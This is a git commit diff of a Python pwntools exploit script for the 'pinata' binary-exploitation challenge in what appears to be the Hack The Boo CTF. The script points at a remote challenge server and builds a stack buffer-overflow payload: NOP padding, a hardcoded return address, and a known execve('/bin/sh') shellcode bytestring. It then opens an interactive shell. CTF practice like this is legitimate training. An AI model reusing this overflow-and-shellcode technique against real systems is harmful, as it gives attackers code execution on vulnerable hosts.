2aee9267938bc7c3df15f5a962c0f6625b948d79
ShundaZhang <zhangshunda@gmail.com>
2023-10-27 19:16:47 +0800

    Solving pinata...

--- HackTheBoo_Compitition/pwn_pinata/challenge/dec.py
+++ HackTheBoo_Compitition/pwn_pinata/challenge/dec.py
@@ -16,27 +16,27 @@ context.arch = 'amd64'
 #elf = ELF('./pinata')
 #libc = ELF('./glibc/libc.so.6')
 
-#ip, port = "94.237.57.79", 53619
-#io = remote(ip, port)
-io = gdb.debug('./pinata', 'break main' )
+ip, port = "83.136.254.234", 35490
+io = remote(ip, port)
+#io = gdb.debug('./pinata', 'break main' )
 #io = process('./pinata')
 
 payload_size = 24
 
 #debug 12345678 -> 0x363534333231
 
-addr = p64(0x7fffffffde38+8)
+addr = p64(0x401016)
 
 #shellcode = asm(shellcraft.linux.cat('flag.txt'))      #OK
-shellcode = asm(shellcraft.popad())
-shellcode += asm(shellcraft.sh())
+#shellcode = asm(shellcraft.popad())
+#shellcode += asm(shellcraft.sh())
 #shellcode = asm(shellcraft.execve('/bin/sh'))
 
 #http://shell-storm.org/shellcode/files/shellcode-806.html
-#shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
 
 #payload = b'\x90'*(payload_size - len(shellcode)) + shellcode + addr
-payload = b'\x90'*payload_size  + addr + shellcode
+payload = b'\x90'*payload_size + addr + shellcode 
 
 io.sendlineafter('>>', payload)
 io.interactive()
